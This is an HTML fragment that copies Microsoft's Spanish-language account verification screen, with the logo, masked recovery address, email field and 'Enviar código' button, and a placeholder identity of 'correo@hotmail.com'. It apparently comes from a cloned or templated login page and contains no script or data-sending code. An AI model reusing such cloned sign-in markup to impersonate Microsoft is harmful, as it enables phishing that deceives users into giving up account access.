<div class="lightbox-cover"></div>

<div>
    <img class="logo" role="img" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">

</div>
<div role="main">
    <!--  -->

    <div class="">

        <div class="slide-in-next">

            <div>

                <div class="identityBanner">

                    <button type="button" class="backButton" id="idBtn_Back" aria-label="Atrás">
                                                                            <img role="presentation" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
                                                                        </button>


                    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="correo@hotmail.com">correo@hotmail.com</div>
                </div>
            </div>
        </div>
        <!-- /ko -->

        <div class="pagination-view animate has-identity-banner slide-in-next">

            <div data-viewid="44" data-showidentitybanner="true">
                <!--  -->

                <div id="proofConfirmationTitle" class="row title ext-title" role="heading" aria-level="1">Verifica tu correo electrónico</div>
                <div class="row form-group">
                    <div id="proofConfirmationDesc" class="form-group" data-bind="text: proofConfirmationDesc">Enviaremos un código de verificación a im*****@gmail.com‎. Escríbalo a continuación para comprobar que esta sea su dirección de correo electrónico.</div>
                    <div role="alert" aria-live="assertive">

                    </div>
                    <div class="placeholderContainer">
                        <input id="proofConfirmationText" autocomplete="off" name="ProofConfirmation" class="form-control input ext-input text-box ext-text-box" type="email" aria-required="true" maxlength="113" aria-label="Correo electrónico" aria-describedby="proofConfirmationTitle proofConfirmationDesc"
                            placeholder="alguien@example.com">
                    </div>
                </div>

                <div class="position-buttons">
                    <div class="row">
                        <div class="col-md-24">
                            <div class="text-13">


                                <div class="form-group">

                                    <a href="#" id="idA_PWD_SwitchToPassword">Use su contraseña en su lugar</a>

                                </div>

                                <div class="form-group">
                                    <a id="proofConfirmationToggle" href="#">Tengo un código</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="win-button-pin-bottom">
                    <div class="row">
                        <div>
                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">


                                <div onclick="" class="inline-block button-item ext-button-item">
                                    <input type="submit" id="next" class="win-button button_primary button ext-button primary ext-primary" value="Enviar código">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

<input type="hidden" name="isRecoveryAttemptPost" value="0">

<div><input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>